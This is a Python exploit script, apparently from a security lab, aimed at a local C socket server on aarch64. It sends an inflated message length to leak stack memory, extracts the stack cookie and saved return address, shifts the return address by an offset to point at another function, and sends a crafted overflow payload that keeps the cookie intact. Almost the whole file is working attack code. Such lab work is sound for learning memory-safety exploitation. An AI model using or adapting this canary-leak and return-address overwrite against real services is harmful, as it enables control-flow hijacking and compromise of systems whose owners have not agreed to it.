#!/bin/python3

# a small interface for the c program.
# takes user input 
# connects to the socket, sends the msg len then the msg. 
# should get it back and echo to terminal

from encodings import utf_8
import socket
import time

# from numpy import little_endian
# from yaml import dump

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 3000))

txt: str = 'A'*255+"\n"
# although out target machine is big-endian (aarch64) we need to send out data in reverse byte order 
msg_len = 256 + 64
txt_len = msg_len.to_bytes(8,byteorder='little')
print(txt_len)
s.send(bytes(txt_len))
#s.send(bytes("test","utf-8"))
s.send(bytes(txt,"utf-8"))

response = s.recv(msg_len)
print(response)
# pretty print it 
#print(response.encode("hex"))
for i in range(0,msg_len,8):
    print("{i}:\t{h}".format(i=i,h=(response[i:i+8].hex())))

#our stack cookie is in the above, 0x138 from sp 
stack_cookie = response[256:256+8]
print("stack cookie:")
print(stack_cookie.hex())
#we also can see the return adress of messageHandleWrapper() (ldp x29 and x30)
return_target_x30 = response[256+16:256+24]
print("return_target_x30")
print(return_target_x30.hex())
#
x29 = response[256+8:256+16]
print("x29")
print(x29.hex())

#lets modify our return target 
#lets get it as an int so we can actually do math with it (beware endianess)
return_target_x30 = int.from_bytes(return_target_x30,byteorder="little")
print("return_target_x30")
print(return_target_x30.to_bytes(8,byteorder="big").hex()) #print it in hex 
#now we can make this point to the funtion we want
# offset found by lookign at binary dump
# 400a2c - 400848 
return_target_x30 -= 0x400a2c - 0x400848
print(return_target_x30)
print(return_target_x30.to_bytes(8,byteorder="big").hex()) #print it in hex 
return_target_x30 = return_target_x30.to_bytes(8,byteorder="little")





# so we need to 
payload = bytearray(256+64)
payload[0:8] = len(payload).to_bytes(8,byteorder='little')
for i in range(8,256+16):
    payload[i] = 0x41 #'A'
#put in the stack cookie 
payload[256+8:256+16] = stack_cookie
#we can also put in the return address for handleMessageWrapper()
#payload[256+16:256+24] = return_target_x30
payload[256+24:256+32] = return_target_x30
#payload[256+16:256+24] = stack_cookie
#payload[256:256+8] = bytes("AAAAAAAA","utf-8")
payload[256+63:256+64] = bytes("\n","utf-8")

print("sending payload")
#our program only handles one message per client, need to open new connection
s.close()
time.sleep(1)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 3000))

s.send(payload)
response = s.recv(msg_len)
print(response)
for i in range(0,msg_len,8):
    print("{i}:\t{h}".format(i=i,h=(response[i:i+8].hex())))


